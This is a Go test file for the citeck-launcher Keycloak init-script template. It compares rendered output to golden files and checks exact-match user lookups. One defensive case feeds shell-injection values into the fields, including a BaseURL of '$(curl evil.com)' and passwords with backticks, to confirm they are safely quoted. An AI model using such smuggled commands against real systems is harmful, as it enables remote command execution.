package namespace

import (
	"errors"
	"flag"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/citeck/citeck-launcher/internal/appfiles"
	"github.com/stretchr/testify/require"
)

// update regenerates the golden files in testdata/keycloak when set.
// Usage: go test ./internal/namespace -run TestRenderKeycloakInitScript -update
var updateKeycloakGoldens = flag.Bool("update", false, "update keycloak init.sh golden files")

func TestRenderKeycloakInitScript(t *testing.T) {
	tests := []struct {
		name   string
		params appfiles.KeycloakInitParams
		golden string
	}{
		{
			// Fresh install: no SA password configured, admin password is
			// the default sentinel "admin" (so the template must NOT emit
			// the ecos-app admin-password block), proxy is localhost with
			// TLS disabled.
			name: "fresh",
			params: appfiles.KeycloakInitParams{
				SAUser:        "citeck",
				LegacySAUser:  "citeck-launcher",
				SAPassword:    "",
				AdminPassword: "admin",
				BaseURL:       "http://localhost",
				OIDCSecret:    "fresh-oidc-secret",
				ProxyPublic:   false,
			},
			golden: "testdata/keycloak/init.sh.fresh.golden",
		},
		{
			// Fully configured: custom admin password (!= "admin" sentinel),
			// non-localhost public hostname (ProxyPublic=true) — both the
			// redirectUris update and the apply-admin-password block are
			// emitted.
			name: "configured",
			params: appfiles.KeycloakInitParams{
				SAUser:        "citeck",
				LegacySAUser:  "citeck-launcher",
				SAPassword:    "sa-secret-32chars-abcdefghijklmno",
				AdminPassword: "strong-admin-pass",
				BaseURL:       "https://citeck.example.com",
				OIDCSecret:    "prod-oidc-secret",
				ProxyPublic:   true,
			},
			golden: "testdata/keycloak/init.sh.configured.golden",
		},
		{
			// Edge case: SA password empty but admin password is custom —
			// SA management block is skipped at runtime via the if/else in
			// the script. Still renders deterministically. Admin-password
			// block IS emitted because AdminPassword != "admin".
			name: "no-sa",
			params: appfiles.KeycloakInitParams{
				SAUser:        "citeck",
				LegacySAUser:  "citeck-launcher",
				SAPassword:    "",
				AdminPassword: "custom-admin",
				BaseURL:       "http://localhost",
				OIDCSecret:    "no-sa-oidc",
				ProxyPublic:   false,
			},
			golden: "testdata/keycloak/init.sh.no-sa.golden",
		},
		{
			// Defense-in-depth: a hostname containing shell-metacharacters
			// (command substitution, backticks, single quotes) must appear
			// in the rendered script inside literal single quotes — bash
			// performs no expansion there, so the dangerous sequences can
			// never be evaluated. This covers the case where hostname
			// validation is bypassed (e.g. direct file edit of
			// namespace.yml) and protects against shell injection at the
			// template layer.
			name: "malicious-hostname",
			params: appfiles.KeycloakInitParams{
				SAUser:        "citeck",
				LegacySAUser:  "citeck-launcher",
				SAPassword:    "p'w`d$(x)",
				AdminPassword: "strong-admin-pass",
				BaseURL:       "https://$(curl evil.com):443",
				OIDCSecret:    "oidc`secret`",
				ProxyPublic:   true,
			},
			golden: "testdata/keycloak/init.sh.malicious-hostname.golden",
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			got, err := appfiles.RenderKeycloakInitScript(tc.params)
			require.NoError(t, err)

			if *updateKeycloakGoldens {
				require.NoError(t, os.MkdirAll(filepath.Dir(tc.golden), 0o755))
				require.NoError(t, os.WriteFile(tc.golden, []byte(got), 0o644))
				return
			}

			want, err := os.ReadFile(tc.golden)
			require.NoError(t, err, "read golden %s (run with -update to create)", tc.golden)
			require.Equal(t, string(want), got, "rendered script does not match %s", tc.golden)
		})
	}
}

// TestRenderKeycloakInitScript_MissingKey verifies that missingkey=error is
// set on the template, so a typo in a template variable surfaces as a render
// error rather than silently producing "<no value>".
func TestRenderKeycloakInitScript_MissingKey(t *testing.T) {
	// The concrete KeycloakInitParams struct has no missing fields by
	// construction; this test ensures the template option is wired up by
	// checking that the rendered output never contains "<no value>" for
	// a normal render.
	got, err := appfiles.RenderKeycloakInitScript(appfiles.KeycloakInitParams{
		SAUser: "x", SAPassword: "y", AdminPassword: "z",
		BaseURL: "http://x", OIDCSecret: "s",
	})
	require.NoError(t, err)
	require.NotContains(t, got, "<no value>")
}

// TestRenderKeycloakInitScript_ExactMatch verifies that the rendered init
// script uses exact-match awk filters (not substring `grep -q`) for all
// keycloak lookups. This guards against the upgrade-path bug where a query
// for the new "citeck" SA returns the legacy "citeck-launcher" user and
// `grep -q "citeck"` matches the substring — causing the script to skip SA
// creation and then fail with "User not found" on set-password.
func TestRenderKeycloakInitScript_ExactMatch(t *testing.T) {
	got, err := appfiles.RenderKeycloakInitScript(appfiles.KeycloakInitParams{
		SAUser:        "citeck",
		LegacySAUser:  "citeck-launcher",
		SAPassword:    "sa-pass",
		AdminPassword: "admin-pass",
		BaseURL:       "http://localhost",
		OIDCSecret:    "oidc",
		ProxyPublic:   false,
	})
	require.NoError(t, err)

	// The unsafe substring-match pattern must be gone from the user check.
	require.NotContains(t, got, `grep -q "$SA_USER"`,
		"user existence check must not use substring grep — it false-matches citeck-launcher when SA_USER=citeck")

	// awk isn't present in the Keycloak 26 image — we use grep+cut instead.
	require.NotContains(t, got, `awk -F, -v u="$SA_USER"`,
		"user existence check must not depend on awk (unavailable in Keycloak image)")

	// The new exact-match user check: cut to column 2, then grep -Fxq (full-line fixed match).
	require.Contains(t, got, `cut -d',' -f2 | grep -Fxq "$SA_USER"`,
		"user existence check must filter the id,username CSV with cut+grep exact match on column 2")

	// Legacy SA id lookup must use exact-match on column 2 via grep+cut.
	require.Contains(t, got, `grep -F ",$LEGACY_SA_USER" | cut -d',' -f1`,
		"legacy SA id lookup must filter id,username CSV with grep+cut exact match")

	// OIDC client id lookup must use exact-match on clientId column via grep+cut.
	require.Contains(t, got, `grep -F ",ecos-proxy-app" | cut -d',' -f1`,
		"OIDC client id lookup must filter id,clientId CSV with grep+cut exact match")
}

// TestKeycloakInitScript_UserCheckBash executes the rendered user-existence
// check against a mock kcadm output and asserts the check correctly treats
// "citeck-launcher" as NOT being "citeck". This is the end-to-end regression
// test for the upgrade-path bug fixed alongside the SA rename.
//
// Uses grep+cut (Keycloak 26 image doesn't ship awk). Skipped if bash isn't
// available (shouldn't happen on Linux CI, but be defensive for other platforms).
func TestKeycloakInitScript_UserCheckBash(t *testing.T) {
	if _, err := exec.LookPath("bash"); err != nil {
		t.Skip("bash not available")
	}

	// Simulate kcadm returning the legacy "citeck-launcher" user (with a
	// realistic UUID in column 1) when queried for username=citeck. The
	// Keycloak `-q` is a substring match, so this is the realistic upgrade
	// scenario that must NOT be treated as "citeck already exists".
	mockKcadmOutput := "abc-123-def,citeck-launcher\n"

	got, err := appfiles.RenderKeycloakInitScript(appfiles.KeycloakInitParams{
		SAUser: "citeck", LegacySAUser: "citeck-launcher",
		SAPassword: "x", AdminPassword: "y",
		BaseURL: "http://x", OIDCSecret: "s",
	})
	require.NoError(t, err)

	// Find the grep+cut pipeline line from the rendered script.
	var checkLine string
	for l := range strings.SplitSeq(got, "\n") {
		if strings.Contains(l, `cut -d',' -f2 | grep -Fxq "$SA_USER"`) {
			checkLine = l
			break
		}
	}
	require.NotEmpty(t, checkLine, "could not find rendered grep+cut user-check line")

	// Extract the pipeline: everything after the last `2>/dev/null` (the kcadm
	// error-redirect) up to the trailing `; then`.
	idx := strings.Index(checkLine, "2>/dev/null | ")
	require.GreaterOrEqual(t, idx, 0, "pipeline not found on user-check line")
	pipeline := strings.TrimSpace(checkLine[idx+len("2>/dev/null"):])
	pipeline = strings.TrimSuffix(pipeline, "; then")
	pipeline = strings.TrimSpace(pipeline)

	// Run: printf "<mockOutput>" | <pipeline> with SA_USER=citeck. Exit code 0
	// means "found", 1 means "not found".
	script := "SA_USER=citeck\nprintf %s " + shellEscape(mockKcadmOutput) + " " + pipeline + "\n"
	cmd := exec.Command("bash", "-c", script)
	err = cmd.Run()

	// We expect exit code 1 (not found): citeck-launcher is NOT citeck.
	require.Error(t, err, "exact-match check must return non-zero (not found) for citeck-launcher when SA_USER=citeck")
	var exitErr *exec.ExitError
	if errors.As(err, &exitErr) {
		require.Equal(t, 1, exitErr.ExitCode(), "expected grep to exit 1 (not found)")
	}

	// Sanity: same pipeline on a matching input returns 0 (found).
	matchingOutput := "abc-123-def,citeck\n"
	script2 := "SA_USER=citeck\nprintf %s " + shellEscape(matchingOutput) + " " + pipeline + "\n"
	cmd2 := exec.Command("bash", "-c", script2)
	require.NoError(t, cmd2.Run(), "exact-match check must return 0 (found) when SA_USER row is present")
}

// shellEscape wraps a string in single quotes for safe inclusion in a bash
// script, escaping any embedded single quotes.
func shellEscape(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}
